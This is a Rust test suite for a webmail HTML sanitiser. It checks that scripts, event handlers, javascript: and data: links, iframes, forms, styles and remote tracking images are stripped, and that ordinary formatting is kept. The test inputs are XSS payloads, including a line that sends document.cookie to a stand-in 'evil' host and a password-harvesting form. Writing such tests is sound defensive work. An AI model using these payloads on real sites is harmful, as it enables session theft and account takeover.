//! Sanitising a stranger's HTML. Getting this wrong is account takeover, not a
//! display glitch: the webmail runs on the origin that holds the session
//! cookie, so script execution there is a compromised account.

use nexus_mailapi::html::sanitise;

fn clean(html: &str) -> String {
    sanitise(html, false).html
}

#[test]
fn script_tags_do_not_survive() {
    let out = clean(r#"<p>hello</p><script>fetch('//evil/'+document.cookie)</script>"#);
    assert!(!out.to_lowercase().contains("<script"));
    assert!(!out.contains("document.cookie"));
    assert!(out.contains("hello"), "the actual message must survive");
}

#[test]
fn event_handlers_are_stripped() {
    // The classic: no <script> tag anywhere, and it still runs.
    for attack in [
        r#"<div onclick="steal()">click</div>"#,
        r#"<img src=x onerror="steal()">"#,
        r#"<body onload="steal()">text</body>"#,
        r#"<p onmouseover="steal()">hover</p>"#,
    ] {
        let out = clean(attack).to_lowercase();
        assert!(!out.contains("onclick"), "{attack}");
        assert!(!out.contains("onerror"), "{attack}");
        assert!(!out.contains("onload"), "{attack}");
        assert!(!out.contains("onmouseover"), "{attack}");
        assert!(!out.contains("steal()"), "{attack}");
    }
}

#[test]
fn javascript_and_data_urls_are_refused() {
    // A link is the other route to script execution.
    let out = clean(r#"<a href="javascript:steal()">click me</a>"#).to_lowercase();
    assert!(!out.contains("javascript:"));

    let out = clean(r#"<a href="data:text/html;base64,PHNjcmlwdD4=">click</a>"#).to_lowercase();
    assert!(!out.contains("data:text/html"));
}

#[test]
fn iframes_objects_and_forms_do_not_survive() {
    // A form posting to an attacker is a credential harvester rendered inside
    // the user's own mail client.
    let out = clean(
        r#"<iframe src="//evil"></iframe><object data="//evil"></object>
           <form action="//evil"><input name="password"></form>"#,
    )
    .to_lowercase();
    for tag in ["<iframe", "<object", "<form", "<input"] {
        assert!(!out.contains(tag), "{tag} survived: {out}");
    }
}

#[test]
fn style_tags_and_attributes_are_removed() {
    // CSS can exfiltrate and can cover the page; a mail body has no business
    // restyling the client around it.
    let out = clean(r#"<style>body{display:none}</style><p style="position:fixed">x</p>"#)
        .to_lowercase();
    assert!(!out.contains("<style"));
    assert!(!out.contains("position:fixed"));
}

#[test]
fn ordinary_formatting_is_preserved() {
    // A sanitiser that eats the message is useless even if it is safe.
    let out = clean(
        r#"<p>Hi <strong>there</strong>,</p><ul><li>one</li><li>two</li></ul>
           <blockquote>quoted</blockquote><a href="https://example.test">link</a>"#,
    );
    for keep in ["<p>", "<strong>", "<ul>", "<li>", "<blockquote>", "example.test"] {
        assert!(out.contains(keep), "lost {keep}: {out}");
    }
}

#[test]
fn links_cannot_reach_back_into_the_page_that_opened_them() {
    let out = clean(r#"<a href="https://example.test">x</a>"#);
    assert!(out.contains("noopener"), "got {out}");
}

// ── Remote content ──────────────────────────────────────────────────────────

#[test]
fn remote_images_are_blocked_by_default_and_reported() {
    // A tracking pixel tells the sender when a message was opened, from what
    // IP, on what client. Loading it silently is how mail clients leak users.
    let result = sanitise(r#"<p>hi</p><img src="https://tracker.test/p.gif?id=you">"#, false);
    assert!(!result.html.to_lowercase().contains("<img"));
    assert!(result.blocked_remote, "the UI must be able to say it withheld something");
}

#[test]
fn images_appear_only_when_the_reader_asks_for_them() {
    // The choice belongs to the person reading, not the person who sent it.
    let result = sanitise(r#"<img src="https://example.test/a.png" alt="a">"#, true);
    assert!(result.html.to_lowercase().contains("<img"));
    assert!(!result.blocked_remote);
}

#[test]
fn even_with_images_allowed_scripts_are_still_gone() {
    // Loading images must not be a way to opt back into everything else.
    let result = sanitise(
        r#"<img src="https://example.test/a.png" onerror="steal()"><script>steal()</script>"#,
        true,
    );
    let out = result.html.to_lowercase();
    assert!(!out.contains("onerror"));
    assert!(!out.contains("<script"));
}

#[test]
fn a_message_with_no_remote_content_is_not_reported_as_blocked() {
    // Otherwise the UI nags about withheld content on every plain message.
    let result = sanitise("<p>just text</p>", false);
    assert!(!result.blocked_remote);
}
